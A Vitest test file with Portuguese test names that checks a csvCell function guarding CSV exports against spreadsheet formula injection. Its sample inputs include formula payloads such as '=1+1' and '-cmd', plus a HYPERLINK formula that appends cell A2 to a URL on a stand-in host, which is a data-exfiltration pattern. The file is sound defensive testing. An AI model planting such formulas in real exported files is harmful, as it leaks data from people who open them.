import { describe, expect, it } from "vitest";
import { csvCell } from "./csv-cell";

describe("csvCell", () => {
  it("neutraliza texto que começa como fórmula", () => {
    expect(csvCell("=1+1")).toBe("'=1+1");
    expect(csvCell("+55 11 9999")).toBe("'+55 11 9999");
    expect(csvCell("-cmd")).toBe("'-cmd");
    expect(csvCell("@SUM(A1)")).toBe("'@SUM(A1)");
    expect(csvCell("\tx")).toBe("'\tx");
  });

  it("neutraliza e aplica aspas quando há aspas ou separador", () => {
    expect(csvCell('=HYPERLINK("http://x/?d="&A2;"abrir")')).toBe(
      `"'=HYPERLINK(""http://x/?d=""&A2;""abrir"")"`
    );
  });

  it("não altera números, inclusive negativos", () => {
    expect(csvCell(-5)).toBe("-5");
    expect(csvCell(0)).toBe("0");
  });

  it("mantém texto comum e trata vazio", () => {
    expect(csvCell("Empresa X Ltda")).toBe("Empresa X Ltda");
    expect(csvCell("2026-10-14")).toBe("2026-10-14");
    expect(csvCell(null)).toBe("");
    expect(csvCell(undefined)).toBe("");
    expect(csvCell("a;b")).toBe('"a;b"');
  });
});
